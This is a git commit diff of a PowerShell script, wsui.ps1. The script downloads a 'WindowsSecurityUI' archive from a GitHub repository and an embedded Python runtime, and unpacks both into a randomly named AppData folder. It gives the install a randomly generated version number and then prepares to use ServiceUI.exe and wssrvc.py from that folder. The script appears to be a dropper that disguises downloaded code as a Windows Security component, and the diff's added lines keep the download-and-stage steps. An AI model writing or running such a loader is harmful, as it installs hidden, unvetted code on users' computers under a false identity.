20204c47d75dca51b67118f54e72d189256e9dd0
xxoo-d <im4x5yn74x@kaiju-security.com>
2026-02-24 01:05:45 -0500

    Update wsui.ps1

--- wsui.ps1
+++ wsui.ps1
@@ -4,15 +4,15 @@ $Length = 10
 $Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
 $RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
 $FolderName = "$RandomString"
-$MAJOR = Get-Random -Minimum 1 -Maximum 11 # 1-10
-$MINOR = Get-Random -Minimum 0 -Maximum 100 # 0-99
-$BUILD = Get-Random -Minimum 0 -Maximum 1000 # 0-999
-$REVISION = Get-Random -Minimum 0 -Maximum 10000 # 0-9999
+$MAJOR = Get-Random -Minimum 1 -Maximum 11
+$MINOR = Get-Random -Minimum 0 -Maximum 100
+$BUILD = Get-Random -Minimum 0 -Maximum 1000
+$REVISION = Get-Random -Minimum 0 -Maximum 10000
 $VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
-wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $env:APPDATA\WindowsSecurityUI.zip
-Expand-Archive -Path $env:APPDATA\WindowsSecurityUI.zip -DestinationPath $env:APPDATA\$FolderName
-wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
-Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurityUI\
+wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $AppDataPath\WindowsSecurityUI.zip
+Expand-Archive -Path $AppDataPath\WindowsSecurityUI.zip -DestinationPath $AppDataPath\$FolderName
+wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $AppDataPath\python-3.14.0-embed-amd64.zip
+Expand-Archive -Path $AppDataPath\python-3.14.0-embed-amd64.zip -DestinationPath $AppDataPath\$FolderName\WindowsSecurityUI
 $winsecUI = Join-Path $AppDataPath $FolderName "WindowsSecurityUI"
 $serviceUIPath = Join-Path $winsecUI "ServiceUI.exe"
 $wssrvcPyPath = Join-Path $winsecUI "wssrvc.py"
